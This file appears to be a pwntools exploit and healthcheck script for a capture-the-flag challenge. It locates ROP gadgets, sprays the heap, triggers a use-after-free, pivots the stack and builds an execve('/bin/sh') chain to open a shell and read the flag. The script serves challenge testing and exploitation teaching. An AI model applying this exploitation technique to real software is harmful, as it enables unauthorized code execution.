#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from sys import argv
from pwn import *

HEALTHCHECK = True
DEBUG = not HEALTHCHECK and len(argv) == 1
CHAL = 'challenge/chal'
EXECVE = 59
FLAG_PREFIX = 'wctf{'

def handle_pow(r: remote):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

def main():
    if DEBUG:
        r = process([CHAL], executable=CHAL)
        ROP_CHAIN_OFFSET = 0x15a0420 - 0x158b000
    else:
        if HEALTHCHECK:
            addr = '127.0.0.1'
            port = 1337
        elif len(argv) == 3:
            port = argv[2]
            addr = argv[1]
        else:
            print(f'Usage: {argv[0]} <addr> <port>')
            exit(1)
        
        r = remote(addr, port)
        ROP_CHAIN_OFFSET = 0x219f3f0 - 0x218a000
        print(r.recvuntil('== proof-of-work: '))
        if r.recvline().startswith(b'enabled'):
            handle_pow(r)

    # Parse heap base
    HEAP_BASE = int(r.recvline().decode('ascii').strip().split(' ')[-1], base=16)
    print(f'Heap base: {HEAP_BASE:#x}')

    if DEBUG:
        from ropper import RopperService
        rs = RopperService()
        rs.addFile(CHAL)
        rs.setArchitectureFor(name=CHAL, arch='x86_64')
        rs.loadGadgetsFor(name=CHAL)
        # This can't find the full gadget for some reason "mov rsp, rbx; mov rbx, qword ptr [rsp]; add rsp, 0x30; ret;
        for file, gadget in rs.search(search='mov rsp, rbx;', name=CHAL):
            pivot = int(str(gadget).split(': ')[0], base=16)
            print("Found stack pivot gadget at " + hex(pivot))
            break

        ROP_CHAIN_OFFSET -= 0x30

        for file, gadget in rs.search(search='pop rax; ret;', name=CHAL):
            pop_rax = int(str(gadget).split(': ')[0], base=16)
            print("Found pop rax gadget at " + hex(pop_rax))
            break
        for file, gadget in rs.search(search='pop rdi; ret;', name=CHAL):
            pop_rdi = int(str(gadget).split(': ')[0], base=16)
            print("Found pop rdi gadget at " + hex(pop_rdi))
            break
        for file, gadget in rs.search(search='pop rsi; pop rbp; ret;', name=CHAL):
            pop_rsi = int(str(gadget).split(': ')[0], base=16)
            print("Found pop rsi gadget at " + hex(pop_rsi))
            break
        for file, gadget in rs.search(search='pop rdx; pop rbx; ret;', name=CHAL):
            pop_rdx = int(str(gadget).split(': ')[0], base=16)
            print("Found pop rdx gadget at " + hex(pop_rdx))
            break
        for file, gadget in rs.search(search='syscall; ret;', name=CHAL):
            syscall = int(str(gadget).split(': ')[0], base=16)
            print("Found syscall gadget at " + hex(syscall))
            break

    else:
        pivot = 0x4ab607
        pop_rax = 0x40af06
        pop_rdi = 0x4020d4
        pop_rsi = 0x4085f9
        pop_rdx = 0x4ac707
        syscall = 0x445a22
        ROP_CHAIN_OFFSET -= 0x30
    
    # recv until prompt
    r.recvuntil(b'>> ').decode('ascii')
    # stage ROP chain
    binsh = b'/bin/sh\0'
    syscall = 0x401b27
    r.sendline(b'arg1 = Store("' + binsh 
               + pop_rdi.to_bytes(8, 'little') + (HEAP_BASE + ROP_CHAIN_OFFSET + 0x30).to_bytes(8, 'little') 
               + pop_rsi.to_bytes(8, 'little') + 0x0.to_bytes(8, 'little') + 0xaaaaaaaaaaaaaaaa.to_bytes(8, 'little') 
               + pop_rdx.to_bytes(8, 'little') + 0x0.to_bytes(8, 'little') + 0xaaaaaaaaaaaaaaaa.to_bytes(8, 'little') 
               + pop_rax.to_bytes(8, 'little') + EXECVE.to_bytes(8, 'little')
               + syscall.to_bytes(8, 'little') + 0xaaaaaaaaaaaaaaaa.to_bytes(8, 'little')
               + b'\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa' + b'")')
    print(r.recvuntil(b'>> ').decode('ascii'))
    # stage rip control payload
    r.sendline(b'arg2 = Store("' + (HEAP_BASE + ROP_CHAIN_OFFSET + len(binsh)).to_bytes(8, 'little') + b'AAAAAAAAA' + pivot.to_bytes(8, 'little') + b'A")')
    r.recvuntil(b'>> ').decode('ascii')
    # heap spray
    r.sendline(b'arg3 = Store(987654321987654321)')
    r.recvuntil(b'>> ').decode('ascii')
    r.sendline(b'arg4 = Store(987654321987654321)')
    r.recvuntil(b'>> ').decode('ascii')
    r.sendline(b'arg5 = Store(987654321987654321)')
    r.recvuntil(b'>> ').decode('ascii')
    r.sendline(b'arg6 = Store(987654321987654321)')
    r.recvuntil(b'>> ').decode('ascii')

    # trigger use-after-free
    r.sendline(b'arg5 = "A" + arg5')
    r.recvuntil(b'>> ').decode('ascii')

    # get rip control
    r.sendline(b'arg3 = Store(arg2)')
    r.recvuntil(b'>> ').decode('ascii')

    # trigger rip control
    r.sendline(b'Print(arg5)')
    if not HEALTHCHECK:
        r.interactive()
    else:
        r.sendline(b'cat /flag && exit')
        result = str(r.recvall().decode('ascii'))
        if result.startswith(FLAG_PREFIX):
            exit(0)
        else:
            main()

if __name__ == '__main__':
    main()
